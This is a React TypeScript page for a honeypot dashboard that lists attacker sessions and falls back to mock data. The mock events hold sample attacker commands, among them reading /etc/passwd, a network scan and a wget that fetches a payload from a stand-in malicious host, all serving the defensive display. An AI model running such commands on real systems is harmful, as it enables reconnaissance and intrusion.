import React, { useState } from 'react';
import SessionViewer from '../components/SessionViewer';
import SessionDetail from '../components/SessionDetail';
import { useApi } from '../hooks/useApi';

interface Session {
  id: string;
  source_ip: string;
  service: string;
  started_at: string;
  ended_at?: string;
  status: 'active' | 'ended' | 'timeout';
  events_count: number;
  risk_score?: number;
}

interface Event {
  id: string;
  session_id: string;
  type: string;
  data: string;
  timestamp: string;
}

const MOCK_SESSIONS: Session[] = [
  { id: 's-001', source_ip: '103.224.1.1', service: 'SSH', started_at: new Date().toISOString(), status: 'active', events_count: 12, risk_score: 0.85 },
  { id: 's-002', source_ip: '185.220.101.1', service: 'HTTP+', started_at: new Date(Date.now() - 3600000).toISOString(), ended_at: new Date(Date.now() - 1800000).toISOString(), status: 'ended', events_count: 8, risk_score: 0.62 },
  { id: 's-003', source_ip: '45.33.32.1', service: 'FTP', started_at: new Date(Date.now() - 7200000).toISOString(), status: 'timeout', events_count: 3, risk_score: 0.35 },
  { id: 's-004', source_ip: '211.218.1.1', service: 'Redis', started_at: new Date(Date.now() - 10800000).toISOString(), ended_at: new Date(Date.now() - 9000000).toISOString(), status: 'ended', events_count: 5, risk_score: 0.41 },
  { id: 's-005', source_ip: '210.140.1.1', service: 'SSH+', started_at: new Date(Date.now() - 5400000).toISOString(), status: 'active', events_count: 15, risk_score: 0.92 },
  { id: 's-006', source_ip: '51.15.1.1', service: 'HTTP', started_at: new Date(Date.now() - 14400000).toISOString(), ended_at: new Date(Date.now() - 13000000).toISOString(), status: 'ended', events_count: 6, risk_score: 0.28 },
];

const MOCK_EVENTS: Event[] = [
  { id: 'e-1', session_id: 's-001', type: 'connect', data: 'Connected from 103.224.1.1', timestamp: new Date().toISOString() },
  { id: 'e-2', session_id: 's-001', type: 'command', data: 'whoami', timestamp: new Date(Date.now() - 30000).toISOString() },
  { id: 'e-3', session_id: 's-001', type: 'command', data: 'cat /etc/passwd', timestamp: new Date(Date.now() - 25000).toISOString() },
  { id: 'e-4', session_id: 's-001', type: 'command', data: 'nmap -sV 192.168.1.0/24', timestamp: new Date(Date.now() - 20000).toISOString() },
  { id: 'e-5', session_id: 's-001', type: 'error', data: 'bash: nmap: command not found', timestamp: new Date(Date.now() - 15000).toISOString() },
  { id: 'e-6', session_id: 's-001', type: 'command', data: 'wget http://malicious.example.com/payload.sh', timestamp: new Date(Date.now() - 10000).toISOString() },
];

const SessionsPage: React.FC = () => {
  const { data: apiSessions, loading } = useApi<Session[]>('/sessions');
  const [selectedSession, setSelectedSession] = useState<Session | null>(null);

  const sessions = (apiSessions && apiSessions.length > 0) ? apiSessions : MOCK_SESSIONS;

  return (
    <div className="space-y-6 max-w-7xl mx-auto">
      <div>
        <h1 className="text-2xl font-bold">Sessions</h1>
        <p className="text-honeytrap-muted text-sm mt-1">
          Live and historical attacker sessions
        </p>
      </div>

      <SessionViewer sessions={sessions} onSelect={setSelectedSession} />

      {selectedSession && (
        <SessionDetail
          sessionId={selectedSession.id}
          ip={selectedSession.source_ip}
          service={selectedSession.service}
          startedAt={selectedSession.started_at}
          endedAt={selectedSession.ended_at}
          status={selectedSession.status}
          riskScore={selectedSession.risk_score}
          events={MOCK_EVENTS}
          onClose={() => setSelectedSession(null)}
        />
      )}
    </div>
  );
};

export default SessionsPage;